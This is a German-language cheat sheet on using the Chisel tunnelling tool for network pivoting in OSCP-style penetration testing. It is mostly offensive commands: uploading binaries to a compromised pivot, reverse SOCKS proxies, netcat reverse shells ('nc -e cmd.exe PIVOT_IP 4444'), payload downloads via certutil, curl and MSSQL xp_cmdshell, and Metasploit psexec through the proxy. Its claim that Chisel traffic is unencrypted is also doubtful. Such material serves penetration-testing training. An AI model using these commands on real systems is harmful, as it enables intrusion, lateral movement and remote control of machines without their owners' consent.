# Chisel - Complete Pivoting & Port Forwarding Guide

.\chisel.exe client 192.168.1.200:8000 R:1433:ms02:1433 R:139:ms02:139 R:135:ms02:135 R:5985:ms02:5985 R:445:ms02:445

## Table of Contents
1. [Installation & Setup](#1-installation--setup)
2. [Basic Concepts](#2-basic-concepts)
3. [Reverse SOCKS Proxy](#3-reverse-socks-proxy)
4. [Port Forwarding](#4-port-forwarding)
5. [Double Pivot Scenarios](#5-double-pivot-scenarios)
6. [Bidirectional Tunneling](#6-bidirectional-tunneling)
7. [Troubleshooting](#7-troubleshooting)
8. [Common OSCP Patterns](#8-common-oscp-patterns)

---

## 1. Installation & Setup

### 1.1 Download Chisel

```bash
# Linux (Kali)
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel

# Windows Binary (für Pivot)
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.9.1_windows_amd64.gz
gunzip chisel_1.9.1_windows_amd64.gz
mv chisel_1.9.1_windows_amd64 chisel.exe
```

### 1.2 Upload auf Pivot

```bash
# Via evil-winrm
evil-winrm -i PIVOT_IP -u admin -p password
upload chisel.exe

# Via SMB
impacket-smbserver share . -smb2support
# Auf Pivot: copy \\KALI_IP\share\chisel.exe C:\temp\chisel.exe

# Via HTTP
python3 -m http.server 80
# Auf Pivot: certutil -urlcache -f http://KALI_IP/chisel.exe chisel.exe
```

---

## 2. Basic Concepts

### 2.1 Server vs Client

**Server (normalerweise auf Kali):**
- Akzeptiert Verbindungen
- Mit `--reverse`: Erlaubt Reverse-Tunnels

**Client (auf Pivot/Target):**
- Verbindet zum Server
- Erstellt Tunnels/Proxies

### 2.2 Tunnel-Typen

| Syntax | Beschreibung | Richtung |
|--------|--------------|----------|
| `R:socks` | Reverse SOCKS5 Proxy | Kali → Pivot → Target |
| `R:8080:localhost:80` | Reverse Port Forward | Target → Pivot:8080 → Kali:80 |
| `8080:localhost:80` | Forward Port Forward | Kali:8080 → Pivot → Pivot:80 |
| `R:0.0.0.0:8080:localhost:80` | Reverse auf allen Interfaces | External → Pivot:8080 → Kali:80 |

### 2.3 Reverse vs Forward Mode

**Reverse Mode (`--reverse`):**
- Server auf Kali mit `--reverse` Flag
- Client erstellt Tunnel ZURÜCK zum Server
- Nützlich wenn Pivot Firewall hat (nur Outbound erlaubt)

**Forward Mode (kein `--reverse`):**
- Client erstellt Tunnel VOM Server zum Client
- Nützlich für Port Forwards vom Pivot zu Kali

---

## 3. Reverse SOCKS Proxy

### 3.1 Basic Setup

**Auf Kali (Server):**
```bash
chisel server -p 8000 --reverse
```

**Auf Pivot (Client):**
```powershell
.\chisel.exe client KALI_IP:8000 R:socks
```

**Proxychains konfigurieren:**
```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
```

**Verwendung:**
```bash
# Nmap über SOCKS
proxychains nmap -sT -Pn TARGET_IP

# Evil-WinRM über SOCKS
proxychains evil-winrm -i TARGET_IP -u user -p pass

# CrackMapExec über SOCKS
proxychains crackmapexec smb TARGET_IP
```

### 3.2 Custom SOCKS Port

```powershell
# Client mit Custom Port
.\chisel.exe client KALI_IP:8000 R:1090:socks

# Proxychains anpassen
# /etc/proxychains4.conf
socks5 127.0.0.1 1090
```

---

## 4. Port Forwarding

### 4.1 Reverse Port Forward (Target → Kali)

**Szenario:** Target soll Kali Port 81 (Webserver) erreichen

**Problem:** Bei Reverse Mode wird Port auf **Kali** geöffnet, nicht auf Pivot!

**Lösung 1: Zweiter Chisel-Tunnel (Forward Mode)**

```bash
# Kali: Zweiter Server OHNE --reverse
chisel server -p 9000

# Pivot: Zweiter Client (Forward Mode)
.\chisel.exe client KALI_IP:9000 8081:KALI_IP:81
```

Jetzt lauscht Port 8081 auf Pivot und forwarded zu Kali:81.

**Lösung 2: Windows netsh portproxy**

```powershell
# Direkt auf Pivot (ohne Chisel)
netsh interface portproxy add v4tov4 listenport=8081 listenaddress=0.0.0.0 connectport=81 connectaddress=KALI_IP

# Firewall-Regel
netsh advfirewall firewall add rule name="Port 8081" dir=in action=allow protocol=TCP localport=8081
```

### 4.2 Reverse Port Forward (Kali → Target)

**Szenario:** Reverse Shell von Target soll bei Kali ankommen

```bash
# Kali: Server
chisel server -p 8000 --reverse

# Pivot: Client mit Port Forward
.\chisel.exe client KALI_IP:8000 R:4444:127.0.0.1:4444

# Kali: Listener
nc -lvnp 4444

# Target: Reverse Shell zu Pivot
nc -e /bin/bash PIVOT_IP 4444
# → Kommt bei Kali Port 4444 an!
```

### 4.3 Multiple Port Forwards

```powershell
# Mehrere Ports gleichzeitig
.\chisel.exe client KALI_IP:8000 R:socks R:4444:127.0.0.1:4444 R:5555:127.0.0.1:5555 R:8888:127.0.0.1:8888
```

---

## 5. Double Pivot Scenarios

### 5.1 Szenario: Kali ↔ Pivot A ↔ Target B

**Ziel:** Kali kann B erreichen UND B kann Kali erreichen

**Setup:**

```bash
# === KALI ===
# 1. Chisel Server (Reverse Mode)
chisel server -p 8000 --reverse

# 2. Webserver für Payloads
python3 -m http.server 81

# 3. Listener für Reverse Shells
nc -lvnp 4444
```

```powershell
# === PIVOT A ===
# Chisel Client (SOCKS + Port Forwards)
.\chisel.exe client KALI_IP:8000 R:socks R:4444:127.0.0.1:4444
```

```bash
# === KALI (neues Terminal) ===
# Proxychains konfigurieren
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# B erreichen via SOCKS
proxychains nmap -sT -Pn B_IP
proxychains evil-winrm -i B_IP -u user -p pass
```

```powershell
# === TARGET B ===
# Reverse Shell zu A (wird zu Kali forwarded)
nc -e cmd.exe A_IP 4444
```

---

## 6. Bidirectional Tunneling

### 6.1 Problem: Target soll Files von Kali downloaden

**Falsche Annahme:** `R:8081:localhost:81` öffnet Port auf Pivot

**Tatsächlich:** Bei `--reverse` wird Port auf **Kali** (Server) geöffnet!

### 6.2 Lösung: Zwei separate Chisel-Tunnel

**Setup:**

```bash
# === KALI ===
# Server 1: Reverse Mode (für SOCKS)
chisel server -p 8000 --reverse

# Server 2: Forward Mode (für Port Forward)
chisel server -p 9000

# Webserver
python3 -m http.server 81
```

```powershell
# === PIVOT ===
# Client 1: Reverse SOCKS (Kali → Pivot → Target)
.\chisel.exe client KALI_IP:8000 R:socks

# Client 2: Forward Port (Target → Pivot:8081 → Kali:81)
.\chisel.exe client KALI_IP:9000 8081:KALI_IP:81
```

**Verify:**
```powershell
# Auf Pivot
netstat -ano | findstr 8081
# Sollte zeigen: TCP 0.0.0.0:8081 LISTENING
```

**Test von Target:**
```bash
# Target kann jetzt von Kali downloaden
curl http://PIVOT_IP:8081/payload.exe -o payload.exe
wget http://PIVOT_IP:8081/nc.exe

# Via xp_cmdshell (MSSQL)
xp_cmdshell "curl http://PIVOT_IP:8081/nc.exe -o C:\temp\nc.exe"
```

### 6.3 Flow Diagram

```
┌──────────────────────────────────────────────────────────────┐
│ BIDIRECTIONAL TUNNELING - Zwei Chisel-Tunnel                │
└──────────────────────────────────────────────────────────────┘

Tunnel 1 (Reverse SOCKS):
Kali ──[proxychains]──> SOCKS:1080 ──[Tunnel]──> Pivot ──> Target
       (outbound)

Tunnel 2 (Forward Port):
Target ──> Pivot:8081 ──[Tunnel]──> Kali:81
                         (inbound)

Server auf Kali:
- chisel server -p 8000 --reverse  (Tunnel 1)
- chisel server -p 9000            (Tunnel 2)

Client auf Pivot:
- chisel.exe client KALI:8000 R:socks           (Tunnel 1)
- chisel.exe client KALI:9000 8081:KALI:81      (Tunnel 2)
```

### 6.4 Alternative: --host Flag (nicht immer zuverlässig)

```bash
# Kali: Server mit --host Flag
chisel server -p 8000 --reverse --host 0.0.0.0

# Pivot: Client mit explizitem Bind
.\chisel.exe client KALI_IP:8000 R:socks R:0.0.0.0:8081:localhost:81
```

**Problem:** Bindet oft trotzdem nur auf 127.0.0.1 → Daher Zwei-Tunnel-Lösung bevorzugen!

---

## 7. Troubleshooting

### 7.1 Chisel verbindet nicht

```powershell
# Firewall auf Pivot checken
netsh advfirewall show allprofiles

# Konnektivität testen
Test-NetConnection -ComputerName KALI_IP -Port 8000

# Auf Kali: Firewall Regel
sudo ufw allow 8000/tcp
```

### 7.2 SOCKS funktioniert nicht

```bash
# Proxychains Config prüfen
cat /etc/proxychains4.conf | grep socks5
# Sollte sein: socks5 127.0.0.1 1080

# Chisel Server Output prüfen
# Sollte zeigen: [server] session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

# Port lauscht?
ss -tlnp | grep 1080
```

### 7.3 Port Forward funktioniert nicht

**Problem:** Port nicht sichtbar in netstat

```powershell
# Ist Chisel verbunden?
# Client sollte zeigen: Connected (Latency XXms)

# Welche Tunnel sind aktiv?
# Server sollte zeigen: tun: proxy#R:4444=>localhost:4444: Listening

# Port auf Pivot prüfen
netstat -ano | findstr 4444
```

**Häufiger Fehler:** Bei Reverse Mode wird Port auf **Kali** geöffnet, nicht auf Pivot!
→ Lösung: Zweiten Chisel-Tunnel im Forward Mode nutzen (siehe 6.2)

### 7.4 Reverse Shell kommt nicht an

```bash
# 1. Ist Port Forward aktiv?
# Chisel Server sollte zeigen: R:4444=>localhost:4444: Listening

# 2. Listener läuft auf Kali?
ss -tlnp | grep 4444

# 3. Test von Pivot aus
nc -zv 127.0.0.1 4444

# 4. Von Target: Erreicht es den Pivot?
nc -zv PIVOT_IP 4444
```

### 7.5 Interface Binding Problem

**Symptom:** Port lauscht nur auf 127.0.0.1, nicht auf 0.0.0.0

```powershell
# Netstat zeigt:
TCP    127.0.0.1:8081    ...  LISTENING
# Statt:
TCP    0.0.0.0:8081      ...  LISTENING
```

**Lösung:**
1. Zwei-Tunnel-Setup verwenden (Forward Mode für diesen Port)
2. Oder netsh portproxy (siehe 4.1 Lösung 2)

### 7.6 Chisel Server Output Analyse

```bash
# KORREKTES Output bei Reverse Mode:
2025/12/16 17:29:00 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2025/12/16 17:29:00 server: session#1: tun: proxy#R:8081=>localhost:81: Listening

# Port 8081 wird auf KALI geöffnet (nicht Pivot!)
# → FALSCH für "Target soll Kali erreichen"

# KORREKTES Output bei Forward Mode:
# (Client auf Pivot: chisel client KALI:9000 8081:KALI:81)
# → Port 8081 auf PIVOT geöffnet, forwarded zu KALI:81
```

---

## 8. Common OSCP Patterns

### 8.1 Pattern 1: Single Pivot SOCKS

```bash
# Kali
chisel server -p 8000 --reverse

# Pivot
.\chisel.exe client KALI_IP:8000 R:socks

# Verwendung
proxychains nmap -sT -Pn TARGET_IP
proxychains crackmapexec smb TARGET_IP
```

### 8.2 Pattern 2: SOCKS + Reverse Shell

```bash
# Kali
chisel server -p 8000 --reverse
nc -lvnp 4444

# Pivot
.\chisel.exe client KALI_IP:8000 R:socks R:4444:127.0.0.1:4444

# Usage
proxychains evil-winrm -i TARGET_IP -u user -p pass
# Auf Target: nc -e /bin/bash PIVOT_IP 4444
```

### 8.3 Pattern 3: Bidirectional (SOCKS + File Download)

```bash
# Kali
chisel server -p 8000 --reverse  # SOCKS
chisel server -p 9000             # Port Forward
python3 -m http.server 81

# Pivot
.\chisel.exe client KALI_IP:8000 R:socks
.\chisel.exe client KALI_IP:9000 8081:KALI_IP:81

# Usage
proxychains nmap -sT TARGET_IP
# Auf Target: curl http://PIVOT_IP:8081/payload.exe -o payload.exe
```

### 8.4 Pattern 4: Full OSCP Setup

```bash
# === KALI ===
# Terminal 1: Chisel Reverse (SOCKS + Reverse Shells)
chisel server -p 8000 --reverse

# Terminal 2: Chisel Forward (File Downloads)
chisel server -p 9000

# Terminal 3: Webserver
python3 -m http.server 81

# Terminal 4: Listener
nc -lvnp 4444

# Proxychains
echo "socks5 127.0.0.1 1080" > /etc/proxychains4.conf
```

```powershell
# === PIVOT ===
# Client 1: SOCKS + Reverse Shell Port
.\chisel.exe client KALI_IP:8000 R:socks R:4444:127.0.0.1:4444

# Client 2: File Download Port
.\chisel.exe client KALI_IP:9000 8081:KALI_IP:81
```

**Capabilities:**
- ✅ Kali → Pivot → Target (via proxychains)
- ✅ Target → Pivot:4444 → Kali:4444 (Reverse Shells)
- ✅ Target → Pivot:8081 → Kali:81 (File Downloads)

### 8.5 Pattern 5: MSSQL xp_cmdshell mit File Download

```bash
# Kali Setup
chisel server -p 8000 --reverse
chisel server -p 9000
python3 -m http.server 81
nc -lvnp 4444
```

```powershell
# Pivot Setup
.\chisel.exe client KALI_IP:8000 R:socks R:4444:127.0.0.1:4444
.\chisel.exe client KALI_IP:9000 8081:KALI_IP:81
```

```sql
# Von MSSQL Target (über Pivot erreichbar)
-- Via proxychains Kali → MSSQL connecten
proxychains impacket-mssqlclient user:pass@MSSQL_IP

-- File downloaden von Pivot:8081 (= Kali:81)
xp_cmdshell "curl http://PIVOT_IP:8081/nc.exe -o C:\temp\nc.exe"

-- Reverse Shell zu Pivot:4444 (= Kali:4444)
xp_cmdshell "C:\temp\nc.exe -e cmd.exe PIVOT_IP 4444"
```

---

## 9. Quick Reference

### 9.1 Command Syntax

```bash
# Server
chisel server -p PORT [--reverse] [--host 0.0.0.0]

# Client - Reverse SOCKS
chisel client SERVER:PORT R:socks
chisel client SERVER:PORT R:PORT:socks  # Custom SOCKS port

# Client - Reverse Port Forward
chisel client SERVER:PORT R:LOCAL_PORT:DEST_HOST:DEST_PORT
chisel client SERVER:PORT R:0.0.0.0:LOCAL_PORT:DEST_HOST:DEST_PORT  # Bind all interfaces

# Client - Forward Port Forward
chisel client SERVER:PORT LOCAL_PORT:DEST_HOST:DEST_PORT

# Multiple Tunnels
chisel client SERVER:PORT R:socks R:4444:localhost:4444 R:5555:localhost:5555
```

### 9.2 Common Ports

| Port | Usage |
|------|-------|
| 8000 | Chisel Server (Reverse) |
| 9000 | Chisel Server (Forward) |
| 1080 | Default SOCKS5 Port |
| 4444 | Reverse Shell Listener |
| 81/8081 | Webserver / Port Forward |

### 9.3 Wichtige Konzepte

**Reverse Mode (`--reverse`):**
- Port wird auf **SERVER** (Kali) geöffnet
- Traffic vom Client → Server
- `R:8081:localhost:81` → Port 8081 auf KALI, forwarded zu Kali's localhost:81 ❌

**Forward Mode (kein `--reverse`):**
- Port wird auf **CLIENT** (Pivot) geöffnet
- Traffic zum Server
- `8081:KALI_IP:81` → Port 8081 auf PIVOT, forwarded zu Kali:81 ✅

**Für File Downloads (Target → Kali):**
→ IMMER Forward Mode verwenden!

---

## 10. Tools Integration

### 10.1 Mit Proxychains

```bash
# Tools die funktionieren
proxychains nmap -sT -Pn TARGET
proxychains crackmapexec smb TARGET
proxychains evil-winrm -i TARGET -u user -p pass
proxychains impacket-psexec user:pass@TARGET
proxychains impacket-mssqlclient user:pass@TARGET
proxychains curl http://TARGET

# Tools die NICHT funktionieren
proxychains nmap -sS TARGET  # SYN Scan nicht über SOCKS
proxychains nmap -sU TARGET  # UDP Scan nicht über SOCKS
proxychains ping TARGET      # ICMP nicht über SOCKS
```

### 10.2 Mit Metasploit

```bash
# msf setzen
msf6 > setg Proxies socks5:127.0.0.1:1080
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS TARGET_IP
msf6 > exploit
```

---

## 11. Security Notes

⚠️ **Wichtig:**
- Chisel-Traffic ist **NICHT verschlüsselt** (nur obfuscated)
- Für Produktion: SSH Tunnel oder VPN bevorzugen
- Chisel-Prozess kann von AV/EDR detektiert werden
- Ports 8000/9000 könnten geblockt sein → Alternative Ports verwenden

---

## 12. Resources

- **Chisel GitHub**: https://github.com/jpillora/chisel
- **HackTricks Tunneling**: https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
- **Chisel Releases**: https://github.com/jpillora/chisel/releases
